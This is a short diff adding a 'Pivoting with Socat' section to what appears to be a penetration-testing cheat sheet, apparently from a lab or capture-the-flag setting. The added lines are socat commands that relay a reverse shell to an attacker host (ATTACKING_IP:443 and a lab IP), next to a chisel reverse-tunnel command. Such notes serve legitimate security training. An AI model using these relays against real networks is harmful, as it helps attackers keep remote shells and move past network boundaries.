@@ -230,6 +230,12 @@ https://gtfobins.github.io/
 ./chisel client 10.50.106.175:8000 R:1080:10.200.105.150:80
 
 ```
+### Pivoting with Socat
+```bash
+#Socat to Reverse Shell Relay
+./socat tcp-l:Listening_Port tcp:ATTACKING_IP:443 
+./socat tcp-l:44444 tcp:10.50.106.175:8448
+```
 ### File Transfer
 
 ### Reverse Shell
